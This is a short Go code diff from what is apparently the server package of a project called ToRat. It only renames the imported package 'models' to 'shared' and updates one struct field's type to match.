@@ -3,7 +3,7 @@ package server
 import (
 	"net/rpc"
 
-	"github.com/lu4p/ToRat/models"
+	"github.com/lu4p/ToRat/shared"
 )
 
 type Client struct {
@@ -24,7 +24,7 @@ type Client struct {
 
 type activeClient struct {
 	Hostname string
-	Dir      models.Dir
+	Dir      shared.Dir
 	RPC      *rpc.Client
 	Client   Client
 }
